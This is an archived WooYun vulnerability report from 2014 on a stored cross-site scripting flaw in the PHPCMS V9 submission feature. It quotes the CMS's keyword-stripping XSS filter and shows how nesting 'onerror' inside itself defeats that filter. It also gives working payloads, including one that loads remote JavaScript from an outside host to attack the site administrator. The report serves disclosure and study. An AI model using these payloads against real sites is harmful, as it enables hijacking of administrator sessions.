{"id": 55316, "wybug_id": "wooyun-2014-061364", "wybug_title": "PHPCMS V9存储型XSS", "wybug_corp": "phpcms", "wybug_author": "phith0n", "wybug_date": "2014-05-20 14:53", "wybug_open_date": "2014-08-18 14:54", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "存储型", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-24：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-18：\t细节向公众公开  简要描述： 无需交互即可触发，绕过过滤函数，可打管理员。 详细说明：  依旧是富文本XSS，完全绕过过滤函数，执行任意XSS代码。众所周知，phpcms是支持投稿的，而投稿这里就能够输入富文本。那么我找到并提取出它的过滤函数，如下：\nfunction remove_xss($string) {     $string = preg_replace('/[\\x00-\\x08\\x0B\\x0C\\x0E-\\x1F\\x7F]+/S', '', $string);    $parm1 = Array('javascript', 'vbscript', 'expression', 'applet', 'meta', 'xml', 'blink', 'link', 'script', 'embed', 'object', 'iframe', 'frame', 'frameset', 'ilayer', 'layer', 'bgsound', 'title', 'base');    $parm2 = Array('onabort', 'onactivate', 'onafterprint', 'onafterupdate', 'onbeforeactivate', 'onbeforecopy', 'onbeforecut', 'onbeforedeactivate', 'onbeforeeditfocus', 'onbeforepaste', 'onbeforeprint', 'onbeforeunload', 'onbeforeupdate', 'onblur', 'onbounce', 'oncellchange', 'onchange', 'onclick', 'oncontextmenu', 'oncontrolselect', 'oncopy', 'oncut', 'ondataavailable', 'ondatasetchanged', 'ondatasetcomplete', 'ondblclick', 'ondeactivate', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'onerror', 'onerrorupdate', 'onfilterchange', 'onfinish', 'onfocus', 'onfocusin', 'onfocusout', 'onhelp', 'onkeydown', 'onkeypress', 'onkeyup', 'onlayoutcomplete', 'onload', 'onlosecapture', 'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onmove', 'onmoveend', 'onmovestart', 'onpaste', 'onpropertychange', 'onreadystatechange', 'onreset', 'onresize', 'onresizeend', 'onresizestart', 'onrowenter', 'onrowexit', 'onrowsdelete', 'onrowsinserted', 'onscroll', 'onselect', 'onselectionchange', 'onselectstart', 'onstart', 'onstop', 'onsubmit', 'onunload');    $parm = array_merge($parm1, $parm2); \tfor ($i = 0; $i < sizeof($parm); $i++) { \t\t$pattern = '/'; \t\tfor ($j = 0; $j < strlen($parm[$i]); $j++) { \t\t\tif ($j > 0) { \t\t\t\t$pattern .= '('; \t\t\t\t$pattern .= '(&#[x|X]0([9][a][b]);?)?'; \t\t\t\t$pattern .= '|(&#0([9][10][13]);?)?'; \t\t\t\t$pattern .= ')?'; \t\t\t}\t\t\t$pattern .= $parm[$i][$j]; \t\t}\t\t$pattern .= '/i';\t\t$string = preg_replace($pattern, '', $string); \t}\treturn $string;}\n而处理富文本过程是这样的：\n$info[$_k] = remove_xss(strip_tags($_v, '<p><a><br><img><ul><li><div>'));\n首先去除<p><a><br><img><ul><li><div>这些标签以外的标签。再使用remove_xss进行过滤。我们看到remove_xss函数，似乎过滤了很多关键字，像我最喜欢onerror是肯定没有了的。没有了？那我们看它最后怎么处理的：\n$string = preg_replace($pattern, '', $string);\n直接将关键字过滤成空了。这种错误居然在phpcms里也会犯？如果我们输入的是oneronerrorror，过滤掉中间那个onerror，外面正好又组成了一个onerror。有了这个属性，就能够触发任意xss语句了，其他限制可以通过html字符实体来绕过。详见漏洞证明。   漏洞证明：  首先需要网站我有权限投稿。然后来到投稿区域（index.php?m=member&c=content&a=published），随便写点，提交。中途用burpsuite抓包，将info[content]中间加入我的payload：\n<img src=# oneronerrorror=alert(1)>\n注意加入后要urlencode一下：\n\n然后管理员在后台相关栏目内能看到我的文章：\n\n打开页面后直接触发，不用用户交互：\n\n来一个加载远程js的exp：\n<img src=1 oneronerrorror=\"$.get&#83;cript('http://xss.com/9WfKui')\">\n   修复方案：  你们懂。   版权声明：转载请注明来源 phith0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-05-21 15:54 厂商回复： 感谢反馈。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}